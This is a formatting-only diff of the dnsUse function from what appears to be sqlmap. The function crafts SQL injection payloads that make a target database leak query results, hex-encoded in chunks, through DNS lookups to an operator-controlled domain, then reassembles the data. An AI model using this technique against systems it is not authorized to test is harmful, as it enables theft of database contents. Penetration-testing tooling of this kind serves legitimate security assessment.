@@ -46,7 +46,8 @@ def dnsUse(payload, expression):
     count = 0
     offset = 1
 
-    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL):
+    if conf.dnsDomain and Backend.getIdentifiedDbms() in (
+            DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL):
         output = hashDBRetrieve(expression, checkConf=True)
 
         if output and PARTIAL_VALUE_MARKER in output or kb.dnsTest is None:
@@ -57,34 +58,59 @@ def dnsUse(payload, expression):
 
             while True:
                 count += 1
-                prefix, suffix = ("%s" % randomStr(length=3, alphabet=DNS_BOUNDARIES_ALPHABET) for _ in xrange(2))
-                chunk_length = MAX_DNS_LABEL / 2 if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL) else MAX_DNS_LABEL / 4 - 2
-                _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
+                prefix, suffix = (
+                    "%s" %
+                    randomStr(
+                        length=3, alphabet=DNS_BOUNDARIES_ALPHABET) for _ in xrange(2))
+                chunk_length = MAX_DNS_LABEL / 2 if Backend.getIdentifiedDbms() in (DBMS.ORACLE,
+                                                                                    DBMS.MYSQL, DBMS.PGSQL) else MAX_DNS_LABEL / 4 - 2
+                _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(
+                    expression)
                 nulledCastedField = agent.nullAndCastField(fieldToCastStr)
-                extendedField = re.search(r"[^ ,]*%s[^ ,]*" % re.escape(fieldToCastStr), expression).group(0)
+                extendedField = re.search(
+                    r"[^ ,]*%s[^ ,]*" %
+                    re.escape(fieldToCastStr),
+                    expression).group(0)
                 if extendedField != fieldToCastStr:  # e.g. MIN(surname)
-                    nulledCastedField = extendedField.replace(fieldToCastStr, nulledCastedField)
+                    nulledCastedField = extendedField.replace(
+                        fieldToCastStr, nulledCastedField)
                     fieldToCastStr = extendedField
-                nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, chunk_length)
+                nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (
+                    nulledCastedField, offset, chunk_length)
                 nulledCastedField = agent.hexConvertField(nulledCastedField)
-                expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)
+                expressionReplaced = expression.replace(
+                    fieldToCastStr, nulledCastedField, 1)
 
-                expressionRequest = getSQLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsDomain)
+                expressionRequest = getSQLSnippet(
+                    Backend.getIdentifiedDbms(),
+                    "dns_request",
+                    PREFIX=prefix,
+                    QUERY=expressionReplaced,
+                    SUFFIX=suffix,
+                    DOMAIN=conf.dnsDomain)
                 expressionUnescaped = unescaper.escape(expressionRequest)
 
                 if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
                     query = agent.prefixQuery("; %s" % expressionUnescaped)
-                    query = "%s%s" % (query, queries[Backend.getIdentifiedDbms()].comment.query)
+                    query = "%s%s" % (
+                        query, queries[Backend.getIdentifiedDbms()].comment.query)
                     forgedPayload = agent.payload(newValue=query)
                 else:
-                    forgedPayload = safeStringFormat(payload, (expressionUnescaped, randomInt(1), randomInt(3)))
+                    forgedPayload = safeStringFormat(
+                        payload, (expressionUnescaped, randomInt(1), randomInt(3)))
 
-                Request.queryPage(forgedPayload, content=False, noteResponseTime=False, raise404=False)
+                Request.queryPage(
+                    forgedPayload,
+                    content=False,
+                    noteResponseTime=False,
+                    raise404=False)
 
                 _ = conf.dnsServer.pop(prefix, suffix)
 
                 if _:
-                    _ = extractRegexResult("%s\.(?P<result>.+)\.%s" % (prefix, suffix), _, re.I)
+                    _ = extractRegexResult(
+                        "%s\.(?P<result>.+)\.%s" %
+                        (prefix, suffix), _, re.I)
                     _ = decodeHexValue(_)
                     output = (output or "") + _
                     offset += len(_)
@@ -102,13 +128,18 @@ def dnsUse(payload, expression):
             retVal = output
 
             if kb.dnsTest is not None:
-                dataToStdout("[%s] [INFO] %s: %s\n" % (time.strftime("%X"), "retrieved" if count > 0 else "resumed", safecharencode(output)))
+                dataToStdout(
+                    "[%s] [INFO] %s: %s\n" %
+                    (time.strftime("%X"),
+                     "retrieved" if count > 0 else "resumed",
+                     safecharencode(output)))
 
                 if count > 0:
                     hashDBWrite(expression, output)
 
         if not kb.bruteMode:
-            debugMsg = "performed %d queries in %.2f seconds" % (count, calculateDeltaSeconds(start))
+            debugMsg = "performed %d queries in %.2f seconds" % (
+                count, calculateDeltaSeconds(start))
             logger.debug(debugMsg)
 
     elif conf.dnsDomain:
